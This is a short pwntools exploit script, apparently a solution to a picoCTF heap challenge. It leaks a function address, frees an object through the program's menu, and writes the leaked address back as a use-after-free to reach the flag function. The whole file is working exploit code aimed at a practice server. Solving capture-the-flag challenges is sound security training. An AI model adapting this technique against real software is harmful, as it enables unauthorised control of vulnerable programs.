#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 4504)

    return r


def main():
    r = conn()

    r.recvuntil(b"(e)xit\n")
    r.sendline(b"s")
    r.recvuntil(b"...")
    address = r.recvline().strip()
    address = int(address, 16)
    log.success("flag fun: {:x}".format(address))

    r.recvuntil(b"(e)xit\n")
    r.sendline(b"i")
    r.recvuntil(b"?\n")
    r.sendline(b"y")

    r.recvuntil(b"(e)xit\n")
    r.sendline(b"l")
    r.recvuntil(b"ways:\n")
    r.send(flat(address))

    r.interactive()

if __name__ == "__main__":
    main()
